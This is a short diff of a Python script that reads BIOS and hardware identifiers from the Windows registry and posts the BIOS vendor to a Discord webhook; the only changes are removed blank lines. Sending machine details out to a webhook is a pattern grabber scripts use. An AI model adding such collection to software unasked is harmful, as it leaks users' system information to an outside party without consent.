@@ -25,17 +25,12 @@ def get_registry_value(path, name="", start_key = None):
             return desc[1]
 ##########FUNCTION FOR GETTING THE REGISTRY KEY############
 
-
-
-
-
 ###########READING THE REGISTRY KEYS##########
 bios_vendor = get_registry_value(r"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor")
 bios_manufacturer = get_registry_value(r"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer")
 bios_version = get_registry_value(r"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion")
 adapter_id = get_registry_value(r"HKEY_LOCAL_MACHINE\SOFTWARE\Intel\PSIS\PSIS_DECODER", "AdapterID")
 ###########READING THE REGISTRY KEYS##########
-
 
 #########SENDIG THE WEBHOOK MESSAGE#########
 webhookSend = DiscordWebhook(url=webhook, content=bios_vendor)
